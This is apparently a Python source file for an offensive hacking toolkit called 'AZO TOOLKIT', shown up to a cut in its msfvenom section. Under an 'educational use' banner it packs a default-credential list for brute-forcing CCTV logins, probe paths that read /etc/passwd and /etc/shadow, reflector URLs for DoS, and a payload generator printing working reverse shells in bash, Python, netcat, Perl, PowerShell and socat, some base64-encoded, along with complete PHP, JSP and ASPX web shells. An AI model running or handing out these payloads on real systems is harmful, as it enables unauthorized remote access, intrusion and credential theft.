#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AZO TOOLKIT
Author: 09AZO14
Version: 3.2
For Educational Purposes Only - Use Responsibly
"""

import os
import sys
import time
import json
import socket
import threading
import base64
import re
import subprocess
import signal
import getpass
import random
import urllib.request
import urllib.parse
import urllib.error
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from queue import Queue
import warnings
warnings.filterwarnings("ignore")

# Try to import optional modules
try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    import aiohttp
    import asyncio
    ASYNC_AVAILABLE = True
except ImportError:
    ASYNC_AVAILABLE = False

try:
    import socks
    import stem
    from stem import Signal
    from stem.control import Controller
    TOR_AVAILABLE = True
except ImportError:
    TOR_AVAILABLE = False

try:
    import shodan
    SHODAN_AVAILABLE = True
except ImportError:
    SHODAN_AVAILABLE = False

try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

try:
    import dns.resolver
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

try:
    from scapy.all import sniff, ARP, send, DNSQR, IP, getmacbyip, Ether, sendp, conf
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# Disable OpenCV for compatibility issues
CV2_AVAILABLE = False

def clear():
    """Clear screen function"""
    os.system('cls' if os.name == 'nt' else 'clear')

def text_animation(text, ms):
    """Text animation function - simplified"""
    print(text)

def check_distro():
    """Check Linux distribution"""
    try:
        with open("/etc/os-release") as f:
            distro = f.read().lower()
            if "debian" in distro or "ubuntu" in distro:
                return "debian_based"
            elif "fedora" in distro or "rhel" in distro or "centos" in distro:
                return "fedora_based"
            elif "arch" in distro or "manjaro" in distro:
                return "arch_based"
            else:
                return "other_os"
    except FileNotFoundError:
        return "unknown"

def is_command_available(cmd):
    """Check if command is available"""
    import shutil
    return shutil.which(cmd) is not None

def get_banner():
    """ASCII banner with provided font"""
    return """
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║        ______   ________   ______                            ║
║       /      \\ |        \\ /      \\                           ║
║      |  $$$$$$\\ \\$$$$$$$$|  $$$$$$\\                          ║
║      | $$__| $$    /  $$ | $$  | $$                          ║
║      | $$    $$   /  $$  | $$  | $$                          ║
║      | $$$$$$$$  /  $$   | $$  | $$                          ║
║      | $$  | $$ /  $$___ | $$__/ $$                          ║
║      | $$  | $$|  $$    \\ \\$$    $$                          ║
║       \\$$   \\$$ \\$$$$$$$$  \\$$$$$$                           ║
║                                                              ║
║                      AZO TOOLKIT                             ║
║                                                              ║
║     Author: 09AZO14                                          ║
║              Version: 3.2 | Educational Use Only             ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
"""

def menu_intro(section_name):
    """Simple menu introduction"""
    clear()
    print(get_banner())
    print(f"\n--- {section_name} ---\n")

class AZOToolkit:
    def email_osint_lookup(self, email):
        """Email OSINT lookup"""
        print("\n--- Email OSINT Lookup ---")
        # Direct API lookups for email intel
        apis = {
            "haveibeenpwned": f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}",
            "emailrep": f"https://emailrep.io/{email}"
        }
        
        results = {}
        for service, url in apis.items():
            try:
                resp = self.make_request(url, headers=self.get_random_headers())
                if resp and resp['status'] == 200:
                    results[service] = resp['content']
            except Exception:
                continue
                
        # Save results
        report_file = f"azo_results/reports/email_osint_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(report_file, "w", encoding="utf-8") as f:
            f.write(f"Email OSINT Lookup\nTarget: {email}\nDate: {datetime.now()}\n\n")
            for service, data in results.items():
                f.write(f"\n=== {service.upper()} ===\n")
                f.write(str(data))
        print(f"[+] Email OSINT report saved: {report_file}")
    
    def social_lookup(self, email=None):
        """GHunt integration (email OSINT)"""
        print("\n--- GHunt Email OSINT ---")
        ghunt_path = "L0p4-Toolkit-main/.files/.osint-tools/email/GHunt/main.py"
        if not email:
            email = input("Enter email for GHunt (or leave empty to show help): ")
        if os.path.exists(ghunt_path):
            try:
                if email:
                    command = [sys.executable, ghunt_path, email]
                else:
                    command = [sys.executable, ghunt_path, "--help"]
                result = subprocess.run(command, capture_output=True, text=True, timeout=180)
                output = result.stdout + "\n" + result.stderr
                print("\n--- GHunt Output ---\n")
                print(output)
                report_file = f"azo_results/reports/ghunt_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                with open(report_file, "w", encoding="utf-8") as f:
                    f.write(f"GHunt Output\nTarget: {email if email else 'HELP'}\nDate: {datetime.now()}\n\n")
                    f.write(output)
                print(f"[+] GHunt report saved: {report_file}")
            except Exception as e:
                print(f"[-] Error running GHunt: {e}")
        else:
            print("[-] GHunt not found in L0p4-Toolkit")
        self.ask_next_action(self.ghunt_lookup, self.osint_menu)

    def image_analysis(self, target=None):
        """Advanced image analysis and face recognition"""
        print("\n--- Image & Face Analysis ---")
        if not target:
            target = input("Enter target (image URL or local path): ")
            
        if not target:
            return
            
        # Analysis types
        analysis_types = {
            "basic": {
                "size": "Image dimensions",
                "format": "File format",
                "exif": "EXIF metadata"
            },
            "face": {
                "detection": "Face detection",
                "landmarks": "Facial landmarks",
                "attributes": "Face attributes"
            },
            "search": {
                "similar": "Similar images",
                "source": "Possible sources",
                "metadata": "Online metadata"
            }
        }
        
        results = {}
        print("\n[*] Analyzing image...")
        
        try:
            # For URLs, download image first
            if target.startswith(('http://', 'https://')):
                resp = self.make_request(target)
                if resp and resp['status'] == 200:
                    temp_file = f"temp_image_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
                    with open(temp_file, 'wb') as f:
                        f.write(resp['content'].encode())
                    target = temp_file
            
            # Basic image analysis
            if os.path.exists(target):
                from PIL import Image
                from PIL.ExifTags import TAGS
                
                with Image.open(target) as img:
                    # Basic info
                    results["basic"] = {
                        "format": img.format,
                        "size": f"{img.width}x{img.height}",
                        "mode": img.mode
                    }
                    
                    # EXIF data
                    exif = {}
                    if hasattr(img, '_getexif') and img._getexif():
                        for tag_id, value in img._getexif().items():
                            tag = TAGS.get(tag_id, tag_id)
                            exif[tag] = str(value)
                    results["exif"] = exif
                
                # Save analysis report
                report_file = f"azo_results/reports/image_analysis_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                with open(report_file, "w", encoding="utf-8") as f:
                    f.write(f"Image Analysis Report\n")
                    f.write(f"Target: {target}\n")
                    f.write(f"Date: {datetime.now()}\n")
                    f.write("="*50 + "\n\n")
                    
                    for category, data in results.items():
                        f.write(f"\n=== {category.upper()} ===\n")
                        if isinstance(data, dict):
                            for key, value in data.items():
                                f.write(f"{key}: {value}\n")
                        else:
                            f.write(str(data) + "\n")
                            
                print(f"[+] Analysis completed")
                print(f"[+] Report saved: {report_file}")
                
                # Cleanup temp file if downloaded
                if target.startswith('temp_image_'):
                    os.remove(target)
            else:
                print("[-] Image file not found")
                
        except Exception as e:
            print(f"[-] Error analyzing image: {e}")
            if target.startswith('temp_image_') and os.path.exists(target):
                os.remove(target)
        
        self.ask_next_action(self.image_analysis, self.osint_menu)
    def __init__(self):
        self.version = "3.2 ULTIMATE"
        self.username = getpass.getuser()
        self.timeout = 5
        self.max_workers = 10
        self.rate_limit = 0.5
        self.results = []
        self.output_dir = "azo_results"
        self.proxy_list = []
        self.tor_enabled = False
        self.stealth_mode = False
        self.verbose = False
        self.exploits_found = []
        self.credentials_found = []
        self.scanning = False
        self.scan_interrupted = False
        
        # Country statistics tracking
        self.country_stats = {}
        
        # Enhanced user agents list
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
            "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
        ]
        
        # Common credentials for CCTV systems
        self.credentials = [
            ("admin", "admin"), ("admin", ""), ("admin", "12345"),
            ("admin", "password"), ("admin", "123456"), ("root", "root"),
            ("root", ""), ("root", "admin"), ("user", "user"),
            ("guest", "guest"), ("admin", "1234"), ("admin", "pass"),
            ("operator", "operator"), ("supervisor", "supervisor"),
            ("demo", "demo"), ("test", "test"), ("admin", "admin123"),
            ("admin", "camera"), ("admin", "security"), ("viewer", "viewer")
        ]
        
        # Vulnerability test endpoints
        self.vuln_endpoints = [
            "/cgi-bin/hi3510/param.cgi?cmd=getuser",
            "/cgi-bin/hi3510/param.cgi?cmd=getgroup", 
            "/PSIA/Custom/SelfExt/userCheck",
            "/device.rsp?opt=user&cmd=list",
            "/cgi-bin/guest/Login.cgi",
            "/cgi-bin/nobody/VerifyCode.cgi",
            "/cgi-bin/nobody/Search.cgi?action=file&file=/etc/passwd",
            "/cgi-bin/nobody/Search.cgi?action=file&file=/etc/shadow",
            "/shell", "/exec", "/cmd", "/ping.cgi", "/traceroute.cgi",
            "/onvif/device_service", "/cgi-bin/test-cgi", "/cgi-bin/test.cgi",
            "/.svn/", "/.git/config", "/backup/", "/temp/", "/test/"
        ]
        
        # WAF/IDS signatures
        self.waf_signatures = {
            "cloudflare": ["cloudflare", "cf-ray"],
            "akamai": ["akamai", "akamai-ghost"],
            "incapsula": ["incapsula", "incap_ses"],
            "f5": ["f5", "bigip"],
            "barracuda": ["barracuda"],
            "modsecurity": ["mod_security", "modsecurity"]
        }
        
        # DoS attack variables
        self.dos_user_agents = [
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
            "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
            "Mozilla/5.0 (X11; Linux x86_64; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
            "Mozilla/5.0 (Windows; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7"
        ]
        
        self.dos_bots = [
            "http://validator.w3.org/check?uri=",
            "http://www.facebook.com/sharer/sharer.php?u="
        ]
        
        # Setup signal handler for graceful interruption
        signal.signal(signal.SIGINT, self.signal_handler)
        
    def signal_handler(self, signum, frame):
        """Handle Ctrl+C gracefully"""
        if self.scanning:
            print("\n[!] Scan interruption requested...")
            self.scan_interrupted = True
            self.scanning = False
        else:
            print("\n[!] Exiting...")
            sys.exit(0)

    def setup_directories(self):
        """Create necessary directories"""
        directories = [
            self.output_dir,
            f"{self.output_dir}/reports",
            f"{self.output_dir}/screenshots", 
            f"{self.output_dir}/logs",
            f"{self.output_dir}/exports"
        ]
        
        for directory in directories:
            if not os.path.exists(directory):
                os.makedirs(directory)

    def show_main_menu(self):
        """Main menu with all L0p4-Toolkit functionality"""
        clear()
        print(get_banner())
        
        menu = """
        ┌──────────────────────────────────────────────────────────────┐
        │                       MAIN MENU                              │
        ├──────────────────────────────────────────────────────────────┤
        │ [1] Web Security Tools                                       │
        │ [2] Network Analysis                                         │
        │ [3] Remote Operations                                        │
        │ [4] Network Stress Test                                      │
        │ [5] Geolocation Tools                                        │
        │ [6] Camera Security                                          │
        │ [7] Intelligence Tools                                       │
        │ [8] Social Engineering                                       │
        ├──────────────────────────────────────────────────────────────┤
        │ [9] Advanced Security Features                               │
        │ [10] System Settings                                         │
        │ [11] Analytics & Reports                                     │
        ├──────────────────────────────────────────────────────────────┤
        │ [0] Exit                                                     │
        │ [99] About & Help                                            │
        └──────────────────────────────────────────────────────────────┘
        """
        print(menu)
        choice = input(f" root@{self.username}/AZO-Toolkit:~$ ")
        return choice

    def log(self, level, message):
        """Simple logging without colors"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        
        if level == 'ERROR':
            prefix = '[ERROR]'
        elif level == 'WARNING':
            prefix = '[WARNING]'
        elif level == 'SUCCESS':
            prefix = '[OK]'
        elif level == 'INFO':
            prefix = '[INFO]'
        else:
            prefix = '[LOG]'
        
        log_message = f"{prefix} [{timestamp}] {message}"
        print(log_message)
        
        # Save to log file
        log_file = f"{self.output_dir}/logs/scan_{datetime.now().strftime('%Y%m%d')}.log"
        with open(log_file, 'a', encoding='utf-8') as f:
            f.write(f"{prefix} [{timestamp}] {message}\n")

    def make_request(self, url, method='GET', data=None, headers=None, auth=None, timeout=None):
        """HTTP request handler"""
        if timeout is None:
            timeout = self.timeout
            
        if headers is None:
            headers = self.get_random_headers()
            
        try:
            if REQUESTS_AVAILABLE:
                response = requests.request(
                    method, url, data=data, headers=headers, 
                    auth=auth, timeout=timeout, verify=False
                )
                return {
                    'status': response.status_code,
                    'content': response.text,
                    'headers': dict(response.headers)
                }
            else:
                # Fallback to urllib
                req = urllib.request.Request(url, data=data, headers=headers)
                with urllib.request.urlopen(req, timeout=timeout) as response:
                    content = response.read().decode('utf-8', errors='ignore')
                    return {
                        'status': response.status,
                        'content': content,
                        'headers': dict(response.headers)
                    }
                    
        except Exception as e:
            if self.verbose:
                self.log('ERROR', f"Request failed for {url}: {e}")
            return None

    def get_random_headers(self):
        """Get random headers for stealth"""
        headers = {}
        headers["Accept"] = "application/json,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        headers["User-Agent"] = random.choice(self.user_agents)
        headers["Accept-Language"] = "en-US,en;q=0.9"
        headers["Accept-Encoding"] = "gzip, deflate"
        headers["Connection"] = "keep-alive"
        headers["Upgrade-Insecure-Requests"] = "1"
        
        return headers

    # ========================= WEB HACKING TOOLS =========================
    
    def web_hacking_menu(self):
        """Web hacking tools menu"""
        menu_intro("Web Hacking Tools")
        
        menu = """
        ┌──────────────────────────────────────────────────┐
        │              WEB HACKING TOOLS                   │
        ├──────────────────────────────────────────────────┤
        │ [1] SQLMap (SQL Injection Scanner)              │
        │ [2] XSStrike (XSS Scanner)                       │
        │ [3] WPScan (WordPress Scanner)                   │
        │ [4] WHOIS Lookup                                 │
        │ [5] DNS Lookup                                   │
        │ [6] Subdomain Scanner                            │
        │ [7] Port Scanner                                 │
        ├──────────────────────────────────────────────────┤
        │ [0] Back to Main Menu                            │
        └──────────────────────────────────────────────────┘
        """
        print(menu)
        
        choice = input(f" root@{self.username}/WebHacking:~$ ")
        
        if choice == "1":
            self.run_sqlmap()
        elif choice == "2":
            self.run_xsstrike()
        elif choice == "3":
            self.run_wpscan()
        elif choice == "4":
            self.whois_lookup()
        elif choice == "5":
            self.dns_lookup()
        elif choice == "6":
            self.subdomain_scanner()
        elif choice == "7":
            self.port_scanner()
        elif choice == "0":
            return
        else:
            print("Invalid option!")
            time.sleep(1)
            self.web_hacking_menu()

    def run_sqlmap(self):
        """SQLMap integration"""
        print("\n--- SQLMap Scanner ---")
        url = input("Enter target URL: ")
        
        if is_command_available("sqlmap"):
            print("[+] Running SQLMap...")
            command = f"sqlmap -u {url} --batch --level=5 --risk=3"
            subprocess.run(command, shell=True)
        else:
            print("[-] SQLMap not found. Install with: sudo apt install sqlmap")
        
        self.ask_next_action(self.run_sqlmap, self.web_hacking_menu)

    def run_xsstrike(self):
        """XSStrike integration (automated with output capture)"""
        print("\n--- XSStrike Scanner ---")
        url = input("Enter target URL: ")
        xsstrike_path = "L0p4-Toolkit-main/.files/.web/XSStrike/xsstrike.py"
        if os.path.exists(xsstrike_path):
            print("[+] Running XSStrike...")
            command = [sys.executable, xsstrike_path, "-u", url, "--crawl"]
            try:
                result = subprocess.run(command, capture_output=True, text=True, timeout=300)
                output = result.stdout + "\n" + result.stderr
                print("\n--- XSStrike Output ---\n")
                print(output)
                # Save output to report
                report_file = f"azo_results/reports/xsstrike_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                with open(report_file, "w", encoding="utf-8") as f:
                    f.write(f"XSStrike Scan Report\nTarget: {url}\nDate: {datetime.now()}\n\n")
                    f.write(output)
                print(f"[+] XSStrike report saved: {report_file}")
            except Exception as e:
                print(f"[-] Error running XSStrike: {e}")
        else:
            print("[-] XSStrike not found in L0p4-Toolkit")
        self.ask_next_action(self.run_xsstrike, self.web_hacking_menu)

    def run_wpscan(self):
        """WPScan integration"""
        print("\n--- WPScan Tool ---")
        
        wpscan_menu = """
        [1] Enumerate Usernames
        [2] Enumerate Plugins
        [3] Enumerate Themes
        [4] Full Vulnerability Scan
        [0] Back
        """
        print(wpscan_menu)
        
        choice = input("root@{}/wpscan:~$ ".format(self.username))
        
        if choice == "0":
            return
        
        target = input("Enter WordPress URL (ex: https://target.com): ")
        
        if is_command_available("wpscan"):
            if choice == "1":
                os.system(f"wpscan --url {target} --enumerate u --random-user-agent")
            elif choice == "2":
                os.system(f"wpscan --url {target} --enumerate p --random-user-agent")
            elif choice == "3":
                os.system(f"wpscan --url {target} --enumerate t --random-user-agent")
            elif choice == "4":
                print("[*] Launching full scan...")
                os.system(f'wpscan --url {target} --enumerate "u,vp,vt" --random-user-agent')
        else:
            print("[-] WPScan not found. Install with: sudo gem install wpscan")
        
        self.ask_next_action(self.run_wpscan, self.web_hacking_menu)

    def whois_lookup(self):
        """WHOIS lookup"""
        print("\n--- WHOIS Lookup ---")
        domain = input("Enter domain (ex: example.com): ")
        
        try:
            if WHOIS_AVAILABLE:
                w = whois.whois(domain)
                print(w)
            else:
                print("[-] whois module not available. Install with: pip install python-whois")
        except Exception as e:
            print(f"WHOIS Error: {e}")
        
        self.ask_next_action(self.whois_lookup, self.web_hacking_menu)

    def dns_lookup(self):
        """DNS lookup"""
        print("\n--- DNS Lookup ---")
        domain = input("Enter domain (ex: example.com): ")
        
        try:
            if DNS_AVAILABLE:
                result = dns.resolver.resolve(domain, 'A')
                for ip in result:
                    print(f"[+] IP: {ip}")
            else:
                print("[-] DNS module not available. Install with: pip install dnspython")
        except Exception as e:
            print(f"DNS Error: {e}")
        
        self.ask_next_action(self.dns_lookup, self.web_hacking_menu)

    def subdomain_scanner(self):
        """Subdomain scanner"""
        print("\n--- Subdomain Scanner ---")
        domain = input("Enter target domain (ex: example.com): ")
        
        # Basic subdomain list
        subdomains = [
            "www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1", "webdisk",
            "ns2", "cpanel", "whm", "autodiscover", "autoconfig", "m", "imap", "test",
            "ns", "blog", "pop3", "dev", "www2", "admin", "forum", "news", "vpn",
            "ns3", "mail2", "new", "mysql", "old", "www1", "email", "api", "shop"
        ]
        
        print(f"[*] Scanning subdomains for {domain}...")
        for sub in subdomains:
            url = f"{sub}.{domain}"
            try:
                socket.gethostbyname(url)
                print(f"[+] Found: {url}")
            except socket.gaierror:
                continue
        
        self.ask_next_action(self.subdomain_scanner, self.web_hacking_menu)

    def port_scanner(self):
        """Port scanner"""
        print("\n--- Port Scanner ---")
        target = input("Enter target IP or domain: ")
        
        ports = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 993, 995, 8080, 8443]
        print(f"[*] Scanning ports on {target}...")
        
        for port in ports:
            s = socket.socket()
            s.settimeout(1)
            try:
                s.connect((target, port))
                print(f"[+] Port {port} is OPEN")
            except:
                pass
            s.close()
        
        self.ask_next_action(self.port_scanner, self.web_hacking_menu)

    # ========================= NETWORK SCANNER =========================

    def network_scanner_menu(self):
        """Network scanner menu"""
        menu_intro("Network Scanner")
        
        menu = """
        ┌─────────────────────────────────────────────────┐
        │               NETWORK SCANNER                   │
        ├─────────────────────────────────────────────────┤
        │ [1] Local Network Scan (ARP)                   │
        │ [2] Web Spy                                     │
        │ [3] Netcat Listener                             │
        │ [4] Network Port Scanner                        │
        ├─────────────────────────────────────────────────┤
        │ [0] Back to Main Menu                           │
        └─────────────────────────────────────────────────┘
        """
        print(menu)
        
        choice = input(f" root@{self.username}/Network:~$ ")
        
        if choice == "1":
            self.local_network_scan()
        elif choice == "2":
            self.web_spy()
        elif choice == "3":
            self.netcat_listener()
        elif choice == "4":
            self.network_port_scanner()
        elif choice == "0":
            return
        else:
            print("Invalid option!")
            time.sleep(1)
            self.network_scanner_menu()

    def local_network_scan(self):
        """Local network ARP scan"""
        print("\n--- Local Network Scan ---")
        print("[*] Scanning local network using ARP...")
        
        if is_command_available("arp-scan"):
            os.system("sudo arp-scan -l")
        elif is_command_available("nmap"):
            os.system("nmap -sn 192.168.1.0/24")
        else:
            print("[-] arp-scan or nmap not found")
        
        self.ask_next_action(self.local_network_scan, self.network_scanner_menu)

    def web_spy(self):
        """Web spy functionality"""
        print("\n--- Web Spy ---")
        print("[!] Web Spy functionality requires administrator privileges")
        print("[!] This functionality monitors network traffic")
        print("[-] Complete implementation requires scapy and root privileges")
        
        self.ask_next_action(self.web_spy, self.network_scanner_menu)

    def netcat_listener(self):
        """Netcat listener"""
        print("\n--- Netcat Listener ---")
        port = input("Enter port to listen on (default 4444): ") or "4444"
        
        if is_command_available("nc"):
            print(f"[*] Listening on port {port}...")
            print("[*] Press Ctrl+C to stop")
            os.system(f"nc -lvp {port}")
        else:
            print("[-] Netcat not found. Install with: sudo apt install netcat")
        
        self.ask_next_action(self.netcat_listener, self.network_scanner_menu)

    def network_port_scanner(self):
        """Network-wide port scanner"""
        print("\n--- Network Port Scanner ---")
        network = input("Enter network (ex: 192.168.1.0/24): ")
        port = input("Enter port to scan (ex: 80): ")
        
        if is_command_available("nmap"):
            print(f"[*] Scanning port {port} on network {network}...")
            os.system(f"nmap -p {port} {network}")
        else:
            print("[-] Nmap not found. Install with: sudo apt install nmap")
        
        self.ask_next_action(self.network_port_scanner, self.network_scanner_menu)

    # ========================= REMOTE ACCESS =========================

    def remote_access_menu(self):
        """Remote access menu"""
        menu_intro("Remote Access")
        
        menu = """
        ┌─────────────────────────────────────────────────┐
        │               REMOTE ACCESS                     │
        ├─────────────────────────────────────────────────┤
        │ [1] FUD Reverse Shell                           │
        │ [2] Generate Payload                            │
        │ [3] Listener Setup                              │
        ├─────────────────────────────────────────────────┤
        │ [0] Back to Main Menu                           │
        └─────────────────────────────────────────────────┘
        """
        print(menu)
        
        choice = input(f" root@{self.username}/RemoteAccess:~$ ")
        
        if choice == "1":
            self.fud_reverse_shell()
        elif choice == "2":
            self.generate_payload()
        elif choice == "3":
            self.setup_listener()
        elif choice == "0":
            return
        else:
            print("Invalid option!")
            time.sleep(1)
            self.remote_access_menu()

    def fud_reverse_shell(self):
        """FUD Reverse Shell"""
        print("\n--- FUD Reverse Shell ---")
        print("[!] WARNING: Use only on authorized systems!")
        
        lhost = input("Enter listener IP (LHOST): ")
        lport = input("Enter listener port (LPORT): ")
        
        # Basic reverse shell payloads
        payloads = {
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "nc": f"nc -e /bin/sh {lhost} {lport}",
            "perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
        }
        
        print("\nGenerated payloads:")
        for name, payload in payloads.items():
            print(f"\n{name.upper()}:")
            print(payload)
        
        self.ask_next_action(self.fud_reverse_shell, self.remote_access_menu)

    def generate_payload(self):
        """Generate various payloads"""
        print("\n--- Generate Payload ---")
        
        payload_menu = """
        [1] Windows Reverse Shell (PowerShell)
        [2] Linux Reverse Shell (Bash)
        [3] Python Reverse Shell
        [4] PHP Web Shell
        [5] JSP Web Shell
        [6] ASPX Web Shell
        [7] Metasploit Payload (msfvenom)
        [8] Custom Payload Generator
        [0] Back
        """
        print(payload_menu)
        
        choice = input("root@{}/PayloadGen:~$ ".format(self.username))
        
        if choice == "0":
            return
        
        lhost = input("Enter LHOST (your IP): ")
        lport = input("Enter LPORT (your port): ")
        
        if choice == "1":
            # Windows PowerShell reverse shell
            payload = f'''$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'''
            print("\nWindows PowerShell Reverse Shell:")
            print(f"powershell -c \"{payload}\"")
            
        elif choice == "2":
            # Linux Bash reverse shells
            payloads = {
                "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
                "nc_traditional": f"nc -e /bin/sh {lhost} {lport}",
                "nc_openbsd": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
                "socat": f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}"
            }
            print("\nLinux Reverse Shells:")
            for name, payload in payloads.items():
                print(f"\n{name.upper()}:")
                print(payload)
                
        elif choice == "3":
            # Python reverse shells
            payloads = {
                "python2": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
                "python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'",
                "python_base64": base64.b64encode(f"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{lhost}',{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);".encode()).decode()
            }
            print("\nPython Reverse Shells:")
            for name, payload in payloads.items():
                print(f"\n{name.upper()}:")
                if "base64" in name:
                    print(f"echo {payload} | base64 -d | python")
                else:
                    print(payload)
                    
        elif choice == "4":
            # PHP Web Shell
            webshell = f'''<?php
if(isset($_REQUEST['cmd'])){{
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}}
?>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<script>document.getElementById("cmd").focus();</script>'''
            print("\nPHP Web Shell:")
            print(webshell)
            
        elif choice == "5":
            # JSP Web Shell
            webshell = f'''<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {{
    out.println("Command: " + request.getParameter("cmd") + "<BR>");
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {{
        out.println(disr);
        disr = dis.readLine();
    }}
}}
%>
<form method="GET" name="myform" action="">
<input type="text" name="cmd">
<input type="submit" value="Send">
</form>'''
            print("\nJSP Web Shell:")
            print(webshell)
            
        elif choice == "6":
            # ASPX Web Shell
            webshell = f'''<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{{
    if (Request.QueryString["cmd"] != null)
    {{
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c "+Request.QueryString["cmd"];
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        Process p = Process.Start(psi);
        StreamReader stmrdr = p.StandardOutput;
        string s = stmrdr.ReadToEnd();
        stmrdr.Close();
        Response.Write("<pre>"+s+"</pre>");
    }}
}}
</script>
<form method="GET">
<input type="text" name="cmd" size="50" value="<%=Request.QueryString["cmd"]%>">
<input type="submit" value="Execute">
</form>'''
            print("\nASPX Web Shell:")
            print(webshell)
            
        elif choice == "7":
            # Metasploit msfvenom payloads
            print("\nMetasploit Payloads (msfvenom):")
            payloads = {
                "Windows x64": f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o shell.exe",
                "Linux x64": f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o shell",
                "Android": f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o payload.apk",
                "PHP": f"msfvenom -p php/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o shell.php",
                "JSP": f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o shell.jsp"
            }
            for name, payload in payloads.items():
                print(f"\n{name}:")
